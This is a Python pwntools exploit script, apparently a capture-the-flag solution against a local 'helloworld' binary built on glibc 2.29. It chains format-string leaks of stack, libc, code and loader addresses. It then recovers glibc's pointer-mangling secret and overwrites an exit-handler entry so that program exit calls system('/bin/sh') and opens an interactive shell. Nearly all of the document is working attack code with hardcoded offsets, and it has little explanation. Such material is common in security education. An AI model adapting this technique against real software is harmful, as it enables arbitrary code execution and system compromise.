from pwn import *

###Structure
'''
enum
{
  ef_free,        /* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa
};

struct exit_function
  {
    /* `flavour' should be of type of the `enum' above but since we need
       this element in an atomic operation we have to use `long int'.  */
    long int flavor;
    union
      {
        void (*at) (void);
        struct
          {
            void (*fn) (int status, void *arg);
            void *arg;
          } on;
        struct
          {
            void (*fn) (void *arg, int status);
            void *arg;
            void *dso_handle;
          } cxa;
      } func;
  };
struct exit_function_list
  {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
  };
'''


###Utils
def leak_stack_libc():
    r.sendlineafter('What is your name? ','AAA%12$pAAA%15$pAAABBB')
    leaks = r.recvuntil('BBB').split(b'AAA')[1:3]
    rsp = int(leaks[0][2:],16)-0x120
    libc_start_addr = int(leaks[1][2:],16)
    return rsp,libc_start_addr

def leak_code(cnt_addr):
    r.sendafter('Forgive my poor memory, what is your name again? ',b'%11$nAAA%14$pAAABBB'.ljust(0x18,b'\x00')+p64(cnt_addr))
    leaks = r.recvuntil('BBB').split(b'AAA')[1]
    libc_csu_init_addr = int(leaks[2:],16)
    return libc_csu_init_addr

def leak_ld(cnt_addr):
    r.sendafter('Forgive my poor memory, what is your name again? ',b'%11$nAAA%33$pAAABBB'.ljust(0x18,b'\x00')+p64(cnt_addr))
    leaks = r.recvuntil('BBB').split(b'AAA')[1]
    dl_init_addr = int(leaks[2:],16)
    return dl_init_addr

def leak_target(cnt_addr,target):
    r.sendafter('Forgive my poor memory, what is your name again? ',b'%10$nAA%11$sAABB'.ljust(0x10,b'\x00')+p64(cnt_addr)+p64(target))
    leaks = r.recvuntil('BB').split(b'AA')[1]
    leaks = u64(leaks.ljust(8,b'\x00'))
    return leaks

def modify(cnt_addr,byte,target_addr):
    if byte==0:
        fmt = (b'%10$n%11$n').ljust(0x10,b'\x00')+p64(cnt_addr)+p64(target_addr)
    else:
        fmt = (b'%10$n%'+str(byte).encode()+b'c%11$n').ljust(0x10,b'\x00')+p64(cnt_addr)+p64(target_addr)
    r.sendafter('Forgive my poor memory, what is your name again? ',fmt)

def send_payload(cnt_addr,payload,target_addr):
    for idx,b in enumerate(payload):
        modify(cnt_addr,b,target_addr+idx)

def rol(num,sft):
    return ((num<<sft)|(num>>(64-sft)))&((1<<64)-1)

def ror(num,sft):
    return ((num>>sft)|(num<<(64-sft)))&((1<<64)-1)

def ptr_get_secret(original,mangled):
    LP_SIZE=8
    return ror(mangled,2*LP_SIZE+1)^original

def ptr_mangle(original,secret):
    LP_SIZE=8
    return rol(original^secret,2*LP_SIZE+1)

def ptr_demangle(mangled,secret):
    LP_SIZE=8
    return ror(mangled,2*LP_SIZE+1)^secret

###Addr
#  libc2.29
#  ld2.29
libc_start_offset = 0x26df0+243
system_offset = 0x47850
initial_offset = 0x1be8a0
dl_init_offset = 0x10820+129
dl_fini_offset = 0x10960
libc_csu_init_offset = 0x12a0
dso_handle_offset = 0x4008

###ROPgadget
L_pop_rdi = 0x268a2

###Exploit
r = process('./helloworld')

rsp,libc_start_addr = leak_stack_libc()
cnt_addr = rsp+0xc
return_addr = rsp+0x48
libc_base = libc_start_addr-libc_start_offset
print(hex(rsp))
print(hex(libc_base))

libc_csu_init_addr = leak_code(cnt_addr)
code_base = libc_csu_init_addr-libc_csu_init_offset
print(hex(code_base))

dl_init_addr = leak_ld(cnt_addr)
ld_base = dl_init_addr-dl_init_offset
print(hex(ld_base))

mangled_dl_fini_addr = leak_target(cnt_addr,libc_base+initial_offset+0x18)
secret = ptr_get_secret(ld_base+dl_fini_offset,mangled_dl_fini_addr)
print(hex(secret))

fake_exitfn = p64(4)+p64(ptr_mangle(libc_base+system_offset,secret))+p64(rsp+0x100)+p64(code_base+dso_handle_offset)
send_payload(cnt_addr,fake_exitfn,libc_base+initial_offset+0x10)

arguments = b'/bin/sh\x00\x00'
send_payload(cnt_addr,arguments,rsp+0x100)

r.sendline('M30W')
r.interactive()


###Reference
#  exit_function
#    https://code.woboq.org/userspace/glibc/stdlib/exit.h.html#exit_function
#  at_exit
#    https://code.woboq.org/userspace/glibc/stdlib/cxa_atexit.c.html
#  PTR_MANGLE/DEMANGLE
#    https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/x86_64/sysdep.h.html
#  exit
#    https://code.woboq.org/userspace/glibc/stdlib/exit.c.html
